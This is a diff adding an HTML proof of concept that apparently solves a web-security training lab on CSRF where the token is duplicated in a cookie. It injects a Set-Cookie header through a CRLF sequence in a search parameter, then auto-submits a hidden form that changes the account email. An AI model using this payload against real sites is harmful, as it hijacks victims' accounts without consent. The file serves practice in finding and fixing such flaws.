@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>
+            Lab: CSRF where token is duplicated in cookie
+        </title>
+    </head>
+    <body>
+        <form action="https://WEBSITE-URL/my-account/change-email" method="post">
+            <input type="text" name="email" value="abcd@normal-user.net">
+            <input type="hidden" name="csrf" value="abcdef1234">
+            <input type="submit">
+        </form>
+
+        <img src="https://WEBSITE-URL/?search=foo%0d%0aSet-Cookie:%20csrf=abcdef1234%3b%20SameSite=None" onerror="document.forms[0].submit()">
+    </body>
+</html>
